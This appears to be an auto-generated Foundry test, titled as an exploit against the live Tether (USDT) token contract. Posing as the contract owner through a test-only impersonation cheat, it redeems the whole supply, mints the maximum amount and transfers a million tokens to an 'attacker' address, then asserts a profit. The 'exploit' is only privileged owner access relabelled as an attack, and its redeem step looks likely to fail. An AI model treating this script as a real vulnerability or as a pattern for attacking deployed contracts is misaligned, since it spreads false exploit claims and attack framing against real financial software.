pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface TetherToken {
    function owner() external view returns (address);
    function deprecated() external view returns (bool);
    function paused() external view returns (bool);
    function totalSupply() external view returns (uint256);
    function redeem(uint256 amount) external;
    function issue(uint256 amount) external;
    function transfer(address to, uint256 value) external;
    function balanceOf(address who) external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        // Get the owner address
        address owner = TetherToken(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Ensure contract is not deprecated and not paused
        require(!TetherToken(TARGET).deprecated(), "contract deprecated");
        require(!TetherToken(TARGET).paused(), "contract paused");

        // Get current total supply
        uint256 totalSupply = TetherToken(TARGET).totalSupply();

        // Redeem all tokens to zero out total supply and owner balance
        TetherToken(TARGET).redeem(totalSupply);

        // Verify total supply is now 0
        assertEq(TetherToken(TARGET).totalSupply(), 0, "total supply should be 0 after redeem");

        // Now issue maximum possible tokens
        uint256 hugeAmount = type(uint256).max;
        TetherToken(TARGET).issue(hugeAmount);

        // Transfer a large amount to attacker (us)
        uint256 transferAmount = 1_000_000 * 10**6; // USDT has 6 decimals
        TetherToken(TARGET).transfer(attacker, transferAmount);

        vm.stopPrank();

        // Verify attacker balance increased
        uint256 attackerBalanceAfter = TetherToken(TARGET).balanceOf(attacker);
        assertGt(attackerBalanceAfter, 0, "attacker balance should be greater than 0");
        uint256 finalBalance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

